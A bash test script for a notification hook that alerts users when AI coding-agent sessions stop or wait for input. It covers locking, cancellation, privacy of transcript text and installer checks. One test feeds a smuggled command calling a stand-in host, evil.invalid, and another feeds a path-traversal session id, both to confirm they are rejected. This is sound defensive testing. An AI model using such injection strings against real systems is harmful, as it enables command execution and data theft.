#!/usr/bin/env bash
set -uo pipefail
REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
HOOK="$REPO/home/hooks/agent-notify.sh"
TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
CURL="$TMP/curl"; LOG="$TMP/calls"; : > "$LOG"
cat > "$CURL" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${MOCK_LOG:?}"
EOF
chmod +x "$CURL"
# Recording osascript + Darwin uname stubs (AC6): the default-on mac lane must
# never pop a real Notification Center alert; the Darwin stub lets the
# credential-free assertions pass on Linux CI too.
OSA="$TMP/osacalls"; : > "$OSA"; export OSA_LOG="$OSA"
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "${2:-}|${3:-}" >> "${OSA_LOG:-/dev/null}"\n' > "$TMP/osascript"; chmod +x "$TMP/osascript"
printf '#!/usr/bin/env bash\necho Darwin\n' > "$TMP/uname"; chmod +x "$TMP/uname"
# Failing osascript stub isolates "mac failure" from Pushover retry state.
printf '#!/usr/bin/env bash\nexit 1\n' > "$TMP/osascript-fail"; chmod +x "$TMP/osascript-fail"
osacount(){ wc -l < "$OSA" | tr -d ' '; }
pass=0; fail=0
ok(){ echo "ok: $1"; pass=$((pass+1)); }; no(){ echo "FAIL: $1"; fail=$((fail+1)); }
run(){ : > "$OSA"; printf '%s' "$2" | PATH="$TMP:$PATH" MOCK_LOG="$LOG" OSA_LOG="$OSA" POLYTOKEN_PROJECT_PATH= AGENT_NOTIFY_STATE_DIR="$TMP/state" AGENT_NOTIFY_DELAY="${AGENT_NOTIFY_DELAY_TEST:-0.05}" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" "$1"; }
count(){ wc -l < "$LOG" | tr -d ' '; }
key(){ printf '%s' "${#1}:$1${#2}:$2" | sha256sum | awk '{print $1}'; }
run_with_state(){ local h="$1" state="$2" payload="$3"; printf '%s' "$payload" | PATH="$TMP:$PATH" MOCK_LOG="$LOG" OSA_LOG="$OSA" AGENT_NOTIFY_STATE_DIR="$state" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" "$h"; }
wait_until(){ local deadline=$((SECONDS+5)); while [ "$SECONDS" -lt "$deadline" ]; do "$@" && return 0; sleep 0.02; done; return 1; }
wait_count(){ [ "$(count)" = "$1" ]; }
wait_text(){ grep -Fq -- "$1" "$LOG"; }
# Prompt allow is unconditional (empty stdout = proceed); with no destination at all and missing jq, nothing runs.
out="$(printf '%s' '{"event":"pre_user_prompt"}' | PATH="$TMP:/usr/bin:/bin" AGENT_NOTIFY_STATE_DIR="$TMP/nojq" bash "$HOOK" polytoken)" && [ -z "$out" ] && ok "prompt allows via empty stdout" || no "prompt allows via empty stdout"
# No-credentials, BRANCHED by mac availability (uname(Darwin) stub makes this
# pass on Linux CI): when the mac lane is available the hook proceeds
# credential-free — state dir created, osascript stub records, zero curl calls.
: > "$LOG"; : > "$OSA"
printf '%s' '{"hook_event_name":"Stop","session_id":"no-creds"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" OSA_LOG="$OSA" PUSHOVER_APP_TOKEN= PUSHOVER_USER_KEY= PUSHOVER_TOKEN= PUSHOVER_USER= AGENT_NOTIFY_STATE_DIR="$TMP/missing" AGENT_NOTIFY_DELAY=0.01 bash "$HOOK" claude
wait_until test -s "$OSA" && [ -d "$TMP/missing" ] && [ "$(count)" = 0 ] && ok "credential-free mac stop mac-sends with zero curl" || no "credential-free mac stop mac-sends with zero curl"
# Non-mac (uname says Linux): today's fail-open behavior — no state dir, silent.
NONMAC="$TMP/nonmac"; mkdir -p "$NONMAC"; printf '#!/usr/bin/env bash\necho Linux\n' > "$NONMAC/uname"; chmod +x "$NONMAC/uname"
printf '%s' '{"hook_event_name":"Stop","session_id":"no-creds-nomac"}' | PATH="$NONMAC:/usr/bin:/bin" PUSHOVER_APP_TOKEN= PUSHOVER_USER_KEY= PUSHOVER_TOKEN= PUSHOVER_USER= AGENT_NOTIFY_STATE_DIR="$TMP/missing-nomac" AGENT_NOTIFY_DELAY=0.01 bash "$HOOK" claude
wait_until wait_count 0 && [ ! -d "$TMP/missing-nomac" ] && ok "non-mac missing credentials fail open before worker" || no "non-mac missing credentials fail open before worker"
# The worker's mac send carries the SAME sanitized title/body the Pushover
# curl receives (ac asserts run under creds; this one checks the mac lane).
: > "$LOG"; : > "$OSA"
run claude '{"hook_event_name":"Stop","session_id":"macbody","message":"mac body check"}'
wait_until test -s "$OSA" && grep -Fq 'session=macbody' "$OSA" && ok "worker mac send receives the sanitized title/body" || no "worker mac send receives the sanitized title/body"
# Unknown/hostile harness identities fail open before state or outbound work.
: > "$LOG"; printf '%s' '{"hook_event_name":"Stop","session_id":"hostile"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/hostile-state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" 'claude;curl https://evil.invalid/$(python);AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' >/dev/null
[ "$(count)" = 0 ] && [ ! -e "$TMP/hostile-state" ] && ok "unknown hostile harness fails open" || no "unknown hostile harness fails open"
# Same harness sessions are independent; events in one session consolidate to latest payload.
run claude '{"hook_event_name":"Stop","session_id":"s1","message":"one"}'
run claude '{"hook_event_name":"Stop","session_id":"s2","message":"two"}'
wait_until wait_count 2 && ok "same-harness distinct-session isolation" || no "same-harness distinct-session isolation"
: > "$LOG"
AGENT_NOTIFY_DELAY_TEST=2 run claude '{"hook_event_name":"Notification","session_id":"same","message":"first"}'
K="$(key claude same)"; wait_until test -s "$TMP/state/$K.gen"
AGENT_NOTIFY_DELAY_TEST=2 run claude '{"hook_event_name":"Notification","session_id":"same","message":"latest"}'
wait_until wait_count 1 && [ "$(grep -Fc first "$LOG" || true)" = 0 ] && grep -q -- '--data-urlencode title=Agent ' "$LOG" && ok "same-session consolidation delivers latest category" || no "same-session consolidation delivers latest category"
# Cross-harness namespace isolation and payload identity/title.
: > "$LOG"; run claude '{"hook_event_name":"Stop","session_id":"cross","message":"claude"}' & p1=$!; run polytoken '{"event":"stop","session_id":"cross","message":"poly"}' & p2=$!; wait $p1 $p2
wait_until wait_count 2 && grep -q -- '--data-urlencode title=Agent ' "$LOG" && grep -q 'session=cross' "$LOG" && ok "cross-harness isolation and identity" || no "cross-harness isolation and identity"
# Prompt cancellation is synchronous and prevents the delayed worker from sending.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.15 run claude '{"hook_event_name":"Stop","session_id":"cancel","message":"wait"}'
out="$(printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"cancel"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" OSA_LOG="$OSA" AGENT_NOTIFY_STATE_DIR="$TMP/state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" claude)"; [ -z "$out" ] || no "cancellation prevents delivery"
! wait_until wait_text cancel && [ "$(osacount)" = 0 ] && ok "cancellation prevents delivery (and mac send)" || no "cancellation prevents delivery (and mac send)"
# A newer generation invalidates the old worker before send.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.5 run claude '{"hook_event_name":"Stop","session_id":"stale","message":"old"}' & p1=$!
K="$(key claude stale)"; wait_until test -s "$TMP/state/$K.gen"
printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"stale"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" AGENT_NOTIFY_STATE_DIR="$TMP/state" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" claude >/dev/null; wait "$p1"
wait_until wait_count 0 && ! grep -q 'session=stale' "$LOG" && ok "stale worker cancellation proven" || no "stale worker cancellation proven"
run claude '{"hook_event_name":"Stop","session_id":"positive-control","message":"control"}'; wait_until wait_count 1 && grep -q 'session=positive-control' "$LOG" && ok "delivery assertion positive control" || no "delivery assertion positive control"
# Successful delivery clears state and permits a later delivery.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"rearm","message":"again"}'; wait_until wait_count 1
AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"rearm","message":"again2"}'; wait_until wait_count 2 && ok "delivery clears and rearms state" || no "delivery clears and rearms state"
# A lock owned by a live process is never reclaimed based on age, even while send is in flight.
: > "$LOG"; K="$(key claude live-lock)"; mkdir -p "$TMP/state/$K.lock"; printf '%s\n' "$$" > "$TMP/state/$K.lock/pid"; printf '%s\n' fixture > "$TMP/state/$K.lock/token"; printf '%s\n' "1" > "$TMP/state/$K.lock/heartbeat"
touch -t 200001010000 "$TMP/state/$K.lock/heartbeat" "$TMP/state/$K.lock"
AGENT_NOTIFY_LOCK_WAIT=1 run claude '{"hook_event_name":"Stop","session_id":"live-lock","message":"must-not-steal"}'
wait_until wait_count 0 && ! grep -q 'session=live-lock' "$LOG" && ok "live owner lock is not reclaimed" || no "live owner lock is not reclaimed"
# A crashed owner is reclaimed after the bounded wait; timestamp setup is portable.
: > "$LOG"; K="$(key claude locked)"; mkdir -p "$TMP/state/$K.lock"; (exit 0) & dead_pid=$!; wait "$dead_pid"; printf '%s\n' "$dead_pid" > "$TMP/state/$K.lock/pid"; printf '%s\n' fixture > "$TMP/state/$K.lock/token"; printf '%s\n' "1" > "$TMP/state/$K.lock/heartbeat"
touch -t 200001010000 "$TMP/state/$K.lock/heartbeat" "$TMP/state/$K.lock"
AGENT_NOTIFY_LOCK_WAIT=1 run claude '{"hook_event_name":"Stop","session_id":"locked","message":"recovered"}'
wait_until wait_count 1 && grep -q -- '--data-urlencode title=Agent ' "$LOG" && ok "crashed-owner lock recovery" || no "crashed-owner lock recovery"
# A partial/legacy lock with a live PID but missing token is never reclaimed.
: > "$LOG"; K="$(key claude partial-live)"; mkdir -p "$TMP/state/$K.lock"; printf '%s\n' "$$" > "$TMP/state/$K.lock/pid"; printf '%s\n' "1" > "$TMP/state/$K.lock/heartbeat"
AGENT_NOTIFY_LOCK_WAIT=1 run claude '{"hook_event_name":"Stop","session_id":"partial-live","message":"must-not-steal"}'
wait_until wait_count 0 && ! grep -q 'session=partial-live' "$LOG" && ok "live partial lock protection" || no "live partial lock protection"
# Partial initialization is reclaimable: an unowned directory is not permanent.
: > "$LOG"; K="$(key claude partial)"; mkdir -p "$TMP/state/$K.lock"; AGENT_NOTIFY_LOCK_WAIT=1 run claude '{"hook_event_name":"Stop","session_id":"partial","message":"recover"}'
wait_until wait_text 'session=partial' && ok "partial lock recovery" || no "partial lock recovery"
# Delimiter-like IDs remain isolated under length-prefixed keying.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"a\u0001b","message":"x"}'; AGENT_NOTIFY_DELAY_TEST=0.01 run claude '{"hook_event_name":"Stop","session_id":"a","message":"y"}'; wait_until wait_count 2 && ok "adversarial session isolation" || no "adversarial session isolation"
# Payload text the harness does not define as notice content stays private; fixed category and safe metadata only.
# Unknown payload junk fields are never forwarded; fixed category and safe metadata only.
: > "$LOG"; run claude '{"hook_event_name":"Notification","session_id":"safe/../id","cwd":"/tmp/proj\u0009name","notification":"leak","reason":"also-leak"}'; wait_until wait_count 1 && ! grep -Eq 'leak' "$LOG" && grep -q -- '--data-urlencode title=Agent ' "$LOG" && ok "payload junk never forwarded" || no "payload junk never forwarded"
# Claude Notification: harness-authored .message is the body; transcript text is not sent on notice events.
LEAK="$TMP/leak.jsonl"; printf '%s\n' '{"type":"assistant","message":{"content":[{"type":"text","text":"TRANSCRIPT SECRET=from-transcript"}]}}' > "$LEAK"
: > "$LOG"; run claude "{\"hook_event_name\":\"Notification\",\"session_id\":\"notice\",\"transcript_path\":\"$LEAK\",\"message\":\"Claude needs your permission\"}"
wait_until wait_text 'Claude needs your permission' && ! grep -q 'from-transcript' "$LOG" && ok "claude notice text forwarded; transcript not" || no "claude notice text forwarded; transcript not"
# Claude Stop: summarize the transcript's last assistant text; project from payload cwd.
: > "$LOG"; run claude "{\"hook_event_name\":\"Stop\",\"session_id\":\"clstop\",\"transcript_path\":\"$LEAK\",\"cwd\":\"/tmp/claudeproj\"}"
wait_until wait_text 'from-transcript' && grep -q 'claudeproj:' "$LOG" && ok "claude stop summarizes transcript" || no "claude stop summarizes transcript"
# The delayed worker must not hold the hook's stdout/stderr: a reader blocked on
# EOF (how both harnesses wait) must see the hook exit well before DELAY elapses.
: > "$LOG"; start="$SECONDS"
AGENT_NOTIFY_DELAY_TEST=2 run claude '{"hook_event_name":"Stop","session_id":"detach","message":"sent-later"}' | cat >/dev/null
reader_s=$((SECONDS - start))
[ "$reader_s" -lt 2 ] && wait_until wait_count 1 && grep -q 'session=detach' "$LOG" && ok "worker stdio detached; hook returns before send (${reader_s}s)" || no "worker stdio detached; hook returns before send (${reader_s}s)"
# Polytoken enrichment: payload has no cwd/title, so project and preview come
# from the session files under the sessions dir.
PSDIR="$TMP/psessions"; mkdir -p "$PSDIR/enr1"
printf '%s' '{"project_path":"/Users/gfranks/workspace/claude-config","last_user_message_preview":"fix the stop hook timeout"}' > "$PSDIR/enr1/session.json"
: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"stop","session_id":"enr1"}'
wait_until wait_text 'fix the stop hook timeout' && grep -q 'claude-config/' "$LOG" && ! grep -q 'session=enr1' "$LOG" && ok "polytoken notification carries project and preview" || no "polytoken notification carries project and preview"
# record.json title is the fallback when session.json has no preview.
mkdir -p "$PSDIR/enr2"; printf '%s' '{"session_title":"enr-two-title"}' > "$PSDIR/enr2/record.json"
: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"stop","session_id":"enr2"}'
wait_until wait_text 'enr-two-title' && grep -q -- '--data-urlencode title=enr-two-title ' "$LOG" && ok "record.json title fallback" || no "record.json title fallback"
# Slash-bearing session ids cannot escape the sessions dir when reading metadata.
mkdir -p "$TMP/enr3"; printf '%s' '{"last_user_message_preview":"pwned"}' > "$TMP/enr3/session.json"
: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"stop","session_id":"../enr3"}'
! wait_until wait_text pwned && ok "session id path traversal contained" || no "session id path traversal contained"
# Polytoken: transcript's last assistant text beats the session.json preview.
mkdir -p "$PSDIR/enr4"
printf '%s\n' '{"type":"assistant","blocks":[{"type":"thinking","thinking":"internal"}]}' '{"type":"assistant","blocks":[{"type":"text","text":"rewrote the notifier summary"}]}' > "$PSDIR/enr4/log.jsonl"
printf '%s' '{"project_path":"/Users/gfranks/workspace/claude-config","last_user_message_preview":"stale preview"}' > "$PSDIR/enr4/session.json"
: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"stop","session_id":"enr4"}'
wait_until wait_text 'rewrote the notifier summary' && grep -q -- '--data-urlencode title=stale preview ' "$LOG" && ok "polytoken stop summarizes transcript over preview" || no "polytoken stop summarizes transcript over preview"
# POLYTOKEN_PROJECT_PATH (exported by the daemon env) names the project directly.
: > "$LOG"; printf '%s' '{"event":"stop","session_id":"envproj"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" POLYTOKEN_PROJECT_PATH="/tmp/envproj" POLYTOKEN_SESSIONS_DIR="$PSDIR" AGENT_NOTIFY_STATE_DIR="$TMP/state" AGENT_NOTIFY_DELAY=0.05 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" polytoken
wait_until wait_text 'envproj: session=envproj' && ok "project env override" || no "project env override"
# Title prefers the session's own naming: record.json title for polytoken,
# transcript summary for claude.
mkdir -p "$PSDIR/enr5"
printf '%s' '{"session_title":"billing refactor"}' > "$PSDIR/enr5/record.json"
printf '%s' '{"last_user_message_preview":"stale preview"}' > "$PSDIR/enr5/session.json"
: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"stop","session_id":"enr5"}'
wait_until wait_text 'billing refactor' && grep -q -- '--data-urlencode title=billing refactor ' "$LOG" && ok "polytoken title from session_title" || no "polytoken title from session_title"
# Polytoken notification events are ambient (background job / subagent
# completions), never "needs input": nothing is scheduled, nothing is sent.
: > "$LOG"; run polytoken '{"event":"notification","session_id":"ambient","message":"job done"}'
K="$(key polytoken ambient)"; sleep 0.3
[ ! -e "$TMP/state/$K.gen" ] && [ "$(count)" = 0 ] && ok "polytoken ambient notification never schedules" || no "polytoken ambient notification never schedules"
# A stop-scheduled send is cancelled by a later ambient notification: the
# subagent/background completion resumes the session without the user, so a
# "Needs Input" push would fire while the agent is working again.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=2 run polytoken '{"event":"stop","session_id":"ambcancel"}'
K="$(key polytoken ambcancel)"; wait_until test -s "$TMP/state/$K.gen"
run polytoken '{"event":"notification","session_id":"ambcancel","message":"job done"}'
! wait_until wait_text ambcancel && ok "ambient notification cancels pending stop send" || no "ambient notification cancels pending stop send"
# A goal-less polytoken stop still schedules...
: > "$LOG"; POLYTOKEN_GOAL_ACTIVE=false run polytoken '{"event":"stop","session_id":"goalfalse"}'
K="$(key polytoken goalfalse)"; wait_until test -s "$TMP/state/$K.gen" && wait_until wait_count 1 && ok "polytoken goal-inactive stop schedules" || no "polytoken goal-inactive stop schedules"
# ...but with a saved-session goal active the driver re-prompts itself after
# stop, so a "Needs Input" notice would be a false positive.
: > "$LOG"; POLYTOKEN_GOAL_ACTIVE=true run polytoken '{"event":"stop","session_id":"goalon"}'
sleep 0.3; [ ! -e "$TMP/state/$(key polytoken goalon).gen" ] && [ "$(count)" = 0 ] && ok "polytoken goal-active stop never schedules" || no "polytoken goal-active stop never schedules"
# Worktree sessions report the branch of the worktree they run in, with the
# repo (not the worktree) as the project name; the main repo's branch must not leak.
WR="$TMP/wtrepo"; git init -q -b main "$WR" 2>/dev/null; git -C "$WR" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init; git -C "$WR" worktree add -q -b probe-branch "$WR/.worktrees/probe" main
mkdir -p "$PSDIR/wtenr"; printf '%s' "{\"project_path\":\"$WR\",\"last_user_message_preview\":\"check the probe\"}" > "$PSDIR/wtenr/session.json"
: > "$LOG"; printf '%s' '{"event":"stop","session_id":"wtenr"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" POLYTOKEN_PROJECT_DIR="$WR/.worktrees/probe" POLYTOKEN_PROJECT_PATH="$WR" POLYTOKEN_SESSIONS_DIR="$PSDIR" AGENT_NOTIFY_STATE_DIR="$TMP/state" AGENT_NOTIFY_DELAY=0.05 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" polytoken
wait_until wait_text 'wtrepo/probe-branch: check the probe' && ok "polytoken worktree branch and repo name" || no "polytoken worktree branch and repo name"
# Claude sessions carry cwd in the payload; a worktree cwd reports its own branch.
: > "$LOG"; run claude "{\"hook_event_name\":\"Stop\",\"session_id\":\"clwt\",\"transcript_path\":\"$LEAK\",\"cwd\":\"$WR/.worktrees/probe\"}"
wait_until wait_text 'wtrepo/probe-branch:' && ok "claude worktree branch from payload cwd" || no "claude worktree branch from payload cwd"
# A main-repo session still reports repo/branch as before.
mkdir -p "$PSDIR/mrenr"; printf '%s' "{\"project_path\":\"$WR\",\"last_user_message_preview\":\"main line\"}" > "$PSDIR/mrenr/session.json"
: > "$LOG"; printf '%s' '{"event":"stop","session_id":"mrenr"}' | PATH="$TMP:$PATH" MOCK_LOG="$LOG" POLYTOKEN_PROJECT_DIR="$WR" POLYTOKEN_PROJECT_PATH="$WR" POLYTOKEN_SESSIONS_DIR="$PSDIR" AGENT_NOTIFY_STATE_DIR="$TMP/state" AGENT_NOTIFY_DELAY=0.05 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash "$HOOK" polytoken
wait_until wait_text 'wtrepo/main: main line' && ok "main-repo session branch unchanged" || no "main-repo session branch unchanged"
# A polytoken session that moved into a worktree after start reports the branch
# of its most recent working directory, taken from the session log's cwd trail.
mkdir -p "$PSDIR/mvenr"
printf '%s' "{\"project_path\":\"$WR\",\"last_user_message_preview\":\"moved mid-session\"}" > "$PSDIR/mvenr/session.json"
printf '%s\n' '{"type":"tool_use","cwd":"'"$WR"'"}' '{"type":"tool_use","cwd":"'"$WR/.worktrees/probe"'"}' > "$PSDIR/mvenr/log.jsonl"
: > "$LOG"; POLYTOKEN_SESSIONS_DIR="$PSDIR" run polytoken '{"event":"stop","session_id":"mvenr"}'
wait_until wait_text 'wtrepo/probe-branch: moved mid-session' && ok "moved session branch from session log cwd" || no "moved session branch from session log cwd"
LEAK2="$TMP/leak2.jsonl"; printf '%s\n' '{"type":"summary","summary":"Fixing the notifier"}' '{"type":"assistant","message":{"content":[{"type":"text","text":"all done"}]}}' > "$LEAK2"
: > "$LOG"; run claude "{\"hook_event_name\":\"Stop\",\"session_id\":\"cltitle\",\"transcript_path\":\"$LEAK2\",\"cwd\":\"/tmp/claudeproj\"}"
wait_until wait_text 'Fixing the notifier' && grep -q ': all done' "$LOG" && ok "claude title from transcript summary" || no "claude title from transcript summary"
# Harness defaults and explicit overrides choose independent config roots.
for h in claude polytoken; do
  base="$TMP/default-$h"; mkdir -p "$base"; : > "$LOG"
  HOME="$base" AGENT_NOTIFY_STATE_DIR= PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user AGENT_NOTIFY_DELAY=2 printf '%s' '{"hook_event_name":"Stop","event":"notification","session_id":"defaults"}' | HOME="$base" PATH="$TMP:$PATH" PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user AGENT_NOTIFY_DELAY=2 bash "$HOOK" "$h"
  expected="$base/.claude/.agent-notify"; [ "$h" = polytoken ] && expected="$base/.config/polytoken/.agent-notify"
  [ -d "$expected" ] && ok "$h default STATE_DIR" || no "$h default STATE_DIR"
done
for h in claude polytoken; do var="${h^^}_CONFIG_DIR"; custom="$TMP/custom-$h"; : > "$LOG"; env HOME="$TMP/unused" "$var=$custom" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash -c "printf '%s' '{\"hook_event_name\":\"Stop\",\"session_id\":\"set\"}' | bash '$HOOK' '$h'"; [ -d "$custom/.agent-notify" ] && ok "$h explicit STATE_DIR" || no "$h explicit STATE_DIR"; done
# Both roots set simultaneously still select the harness-specific root.
CLAUDE_CONFIG_DIR="$TMP/both-claude" POLYTOKEN_CONFIG_DIR="$TMP/both-polytoken" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash -c "printf '%s' '{\"hook_event_name\":\"Stop\",\"session_id\":\"both\"}' | bash '$HOOK' claude"
CLAUDE_CONFIG_DIR="$TMP/both-claude" POLYTOKEN_CONFIG_DIR="$TMP/both-polytoken" AGENT_NOTIFY_DELAY=2 PUSHOVER_APP_TOKEN=app PUSHOVER_USER_KEY=user bash -c "printf '%s' '{\"hook_event_name\":\"Stop\",\"session_id\":\"both\"}' | bash '$HOOK' polytoken"
[ -d "$TMP/both-claude/.agent-notify" ] && [ -d "$TMP/both-polytoken/.agent-notify" ] && ok "simultaneous harness-specific roots" || no "simultaneous harness-specific roots"
# Wiring: Notification and Stop async, no standalone SubagentStop notifier.
jq -e '([.hooks.Notification[], .hooks.Stop[]] | map(.hooks[] | select(.command | contains("agent-notify.sh"))) | length == 2 and all(.[]; .async == true))' "$REPO/home/settings.recommended.json" >/dev/null && jq -e '([.hooks.SubagentStop[].hooks[]?.command // ""] | all(.[]; contains("agent-notify.sh") | not))' "$REPO/home/settings.recommended.json" >/dev/null && ok "Claude wiring" || no "Claude wiring"
jq -e '([.[] | select(.name == "agent-notify" and .event == "notification")] | length == 1) and ([.[] | select(.name | startswith("agent-notify")) | .handler.bash | contains(" polytoken")] | all)' "$REPO/polytoken/hooks.json" >/dev/null && ok "Polytoken wiring" || no "Polytoken wiring"
grep -q 'DELAY="${AGENT_NOTIFY_DELAY:-60}"' "$HOOK" && ok "production delay default" || no "production delay default"
# Exercise the actual Claude installer into a temporary destination, then verify status, content, and mode.
DEST="$TMP/installed-claude"; HOME="$TMP/home"; mkdir -p "$HOME"
if CLAUDE_CONFIG_DIR="$DEST" CLAUDE_CONFIG_TTY=/dev/null CLAUDE_CONFIG_OVERWRITE=1 bash "$REPO/install.sh" --target claude --overwrite >/dev/null 2>&1; then
  [ -f "$DEST/hooks/agent-notify.sh" ] && cmp -s "$HOOK" "$DEST/hooks/agent-notify.sh" && [ -x "$DEST/hooks/agent-notify.sh" ] && [ -f "$DEST/lib/notify-mac.sh" ] && ok "actual installer status, content, and mode" || no "actual installer status, content, and mode"
else
  no "actual installer status, content, and mode"
fi
# Watchdog-only install path: install-session-watchdog.sh must place the mac
# Notification Center module at ~/.claude/lib/ (no other suite covers it).
# Skipped on hosts with launchctl: running the installer there would load a
# real LaunchAgent. On Linux the installer stops at the launchctl step (after
# the file copies), which is exactly what this check exercises.
if command -v launchctl >/dev/null 2>&1; then
  echo "SKIP: watchdog-only install check requires a host without launchctl" >&2
else
  WDHOME="$TMP/wd-home"; mkdir -p "$WDHOME"
  HOME="$WDHOME" bash "$REPO/scripts/install-session-watchdog.sh" >/dev/null 2>&1
  [ -f "$WDHOME/.claude/lib/notify-mac.sh" ] && cmp -s "$REPO/home/lib/notify-mac.sh" "$WDHOME/.claude/lib/notify-mac.sh" \
    && [ -f "$WDHOME/.claude/session-watchdog.sh" ] \
    && ok "watchdog-only install places the mac module" || no "watchdog-only install places the mac module"
fi
# Exercise the actual Polytoken installer when its required yq-v4 dependency exists.
if command -v yq >/dev/null 2>&1 && yq --version 2>/dev/null | grep -Eq 'version v4\.'; then
  PTDEST="$TMP/installed-polytoken"; mkdir -p "$PTDEST/hooks"; cp "$REPO/polytoken/config.recommended.yaml" "$PTDEST/config.yaml"
  printf '%s\n' '[{"name":"unrelated","event":"session_start","handler":{"bash":"keep-me"}},{"name":"agent-notify","event":"notification","handler":{"bash":"old-notifier"}}]' > "$PTDEST/hooks.json"
  if POLYTOKEN_CONFIG_DIR="$PTDEST" POLYTOKEN_CONFIG_TTY=/dev/null bash "$REPO/scripts/install-polytoken.sh" 1 >/dev/null 2>&1; then
    mode="$(stat -c '%a' "$HOOK" 2>/dev/null || stat -f '%Lp' "$HOOK")"; installed_mode="$(stat -c '%a' "$PTDEST/hooks/agent-notify.sh" 2>/dev/null || stat -f '%Lp' "$PTDEST/hooks/agent-notify.sh")"
    jq -e '([.[].name] | {names:., unrelated: (index("unrelated") != null), notifier: (index("agent-notify") != null), cancel: (index("agent-notify-cancel") != null)}) as $n | ($n.unrelated and $n.notifier and $n.cancel and ([.[] | select(.name == "agent-notify")] | length == 1) and ([.[] | select(.name == "agent-notify-cancel")] | length == 1) and ([.[] | select(.name == "unrelated" and .handler.bash == "keep-me")] | length == 1))' "$PTDEST/hooks.json" >/dev/null && cmp -s "$HOOK" "$PTDEST/hooks/agent-notify.sh" && [ -x "$PTDEST/hooks/agent-notify.sh" ] && grep -Fq '${POLYTOKEN_CONFIG_DIR:-$HOME/.config/polytoken}' "$PTDEST/hooks.json" && ok "actual Polytoken installer merge, bytes, mode, paths" || no "actual Polytoken installer merge, bytes, mode, paths"
  else
    no "actual Polytoken installer merge, bytes, mode, paths"
  fi
else
  echo "SKIP: actual Polytoken installer requires mikefarah/yq v4" >&2
  no "actual Polytoken installer (yq v4 unavailable)"
fi
# ask_user_question: the question itself is a wait-for-user that fires no
# stop, so pre_tool_use schedules a push carrying the question and the
# answer (post_tool_use, same tool) cancels it like a prompt does.
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.15 run polytoken '{"event":"pre_tool_use","tool_name":"ask_user_question","session_id":"askq","input":{"questions":[{"question":"which approach do you want?"}]}}'
wait_until wait_text 'which approach do you want' && grep -q -- '--data-urlencode title=Agent ' "$LOG" && ok "ask_user_question schedules a push with the question" || no "ask_user_question schedules a push with the question"
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=2 run polytoken '{"event":"pre_tool_use","tool_name":"ask_user_question","session_id":"answait","input":{"questions":[{"question":"pick one"}]}}'
K="$(key polytoken answait)"; wait_until test -s "$TMP/state/$K.gen" && ok "ask_user_question schedules pending state" || no "ask_user_question schedules pending state"
POLYTOKEN_HOOK_MATCHER_SUBJECT=ask_user_question run polytoken '{"event":"post_tool_use","tool_name":"ask_user_question","session_id":"answait"}'
[ ! -e "$TMP/state/$K.gen" ] && ok "the answer cancels a pending question push" || no "the answer cancels a pending question push"
: > "$LOG"; AGENT_NOTIFY_DELAY_TEST=0.5 run polytoken '{"event":"stop","session_id":"no-cancel"}'
K="$(key polytoken no-cancel)"; wait_until test -s "$TMP/state/$K.gen"
POLYTOKEN_HOOK_MATCHER_SUBJECT=shell_exec run polytoken '{"event":"post_tool_use","tool_name":"shell_exec","session_id":"no-cancel"}'
wait_until wait_text no-cancel && ok "post_tool_use for other tools never cancels" || no "post_tool_use for other tools never cancels"
# Title/body format: long titles truncate with an ellipsis; no "Needs Input".
LEAK3="$TMP/leak3.jsonl"; printf '%s\n' '{"type":"summary","summary":"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"}' > "$LEAK3"
: > "$LOG"; run claude "{\"hook_event_name\":\"Stop\",\"session_id\":\"trunct\",\"transcript_path\":\"$LEAK3\",\"cwd\":\"/tmp/claudeproj\"}"
